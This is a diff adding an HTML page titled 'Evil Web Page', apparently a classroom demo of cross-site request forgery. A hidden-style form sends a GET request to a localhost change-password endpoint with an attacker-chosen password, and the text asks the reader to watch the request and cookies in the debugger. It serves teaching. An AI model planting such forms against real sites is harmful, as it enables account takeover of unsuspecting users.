@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="EN" xml:lang="en">
+  <head>
+    <title>Evil Web Page</title>
+    <style>
+      body {
+        background-image: url("hacker.jpg");
+      }
+    </style>
+  </head>
+  <body>
+    <h1 style="color: #ffffff">Attack Web Page</h1>
+
+    <p style="color: black; background-color: white; width: 600px">
+      Look at the URL above, and notice where this page was loaded from, an evil
+      hacker website!! The hacker has created a HTML form that will change the
+      password on the main parent site. Open the debugger and watch the HTTP
+      call and the cookies that are sent.
+    </p>
+    <form
+      style="color: #ffffff"
+      method="GET"
+      action="https://localhost:9381/change-password"
+      id="changepwdform"
+    >
+      New Password
+      <input name="new-password" value="s3t-th1s-t0-hacker-passw0rd" />
+    </form>
+    <button id="getjsonbutton" type="submit" form="changepwdform">
+      Change Password
+    </button>
+  </body>
+</html>
